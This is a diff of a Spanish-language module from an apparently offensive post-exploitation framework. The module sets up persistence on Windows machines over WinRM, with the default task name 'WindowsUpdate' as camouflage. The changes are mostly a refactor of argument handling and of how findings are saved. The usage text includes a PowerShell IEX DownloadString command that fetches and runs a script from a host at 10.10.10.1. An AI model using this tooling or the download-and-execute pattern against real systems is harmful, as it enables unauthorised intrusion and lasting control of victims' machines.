@@ -16,6 +16,7 @@ Uso:
   python lobera.py winrm -t 10.10.10.5 --script=persistence -u USER -p PASS --method profile --exec "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.1/s.ps1')"
 """
 
+from scripts.base import BaseScript
 from core.output import console
 from core import session_db
 
@@ -168,25 +169,23 @@ if ($content -notmatch [regex]::Escape($marker)) {{
 
 # ── Script principal ───────────────────────────────────────────────────────────
 
-class Script:
-    NAME        = "persistence"
-    DESCRIPTION = "Persistencia remota vía WinRM: schtask, registro, startup, servicio, $PROFILE"
+class Script(BaseScript):
+    name        = "persistence"
+    protocol    = "winrm"
+    category    = "post"
+    description = "Persistencia remota vía WinRM: schtask, registro, startup, servicio, $PROFILE"
 
-    def __init__(self, target, creds):
-        self.target = target
-        self.creds  = creds
-
-    def run(self, args):
+    def run(self, **kwargs):
         target   = str(self.target.ip)
-        user     = getattr(args, "user",         None) or (self.creds.username if self.creds else None)
-        password = getattr(args, "password",     "") or (self.creds.password if self.creds else "")
-        method   = getattr(args, "method",       "schtask") or "schtask"
-        payload  = getattr(args, "exec",         None)
-        name     = getattr(args, "persist_name", "WindowsUpdate")
-        hive     = getattr(args, "hive",         "HKLM")
-        trigger  = getattr(args, "trigger",      "logon")
-        ssl      = getattr(args, "ssl",          False)
-        port     = getattr(args, "port",         None)
+        user     = kwargs.get("user") or (self.creds.user if self.creds else None)
+        password = kwargs.get("password") or (self.creds.password if self.creds else "")
+        method   = kwargs.get("method") or "schtask"
+        payload  = kwargs.get("exec")
+        name     = kwargs.get("persist_name") or "WindowsUpdate"
+        hive     = kwargs.get("hive") or "HKLM"
+        trigger  = kwargs.get("trigger") or "logon"
+        ssl      = kwargs.get("ssl", False)
+        port     = kwargs.get("port")
 
         if not user:
             console.print("[red]Falta -u USER[/red]")
@@ -234,14 +233,8 @@ class Script:
 
         if success:
             session_db.save_finding(
-                category="persistence",
-                data={
-                    "target":  target,
-                    "proto":   "winrm",
-                    "method":  method,
-                    "name":    name,
-                    "payload": payload,
-                }
+                target, "WinRM", "persistence",
+                f"method={method} name={name} payload={payload}"
             )
             console.print(f"\n  [bold green]✓ Persistencia establecida[/bold green]")
         else:
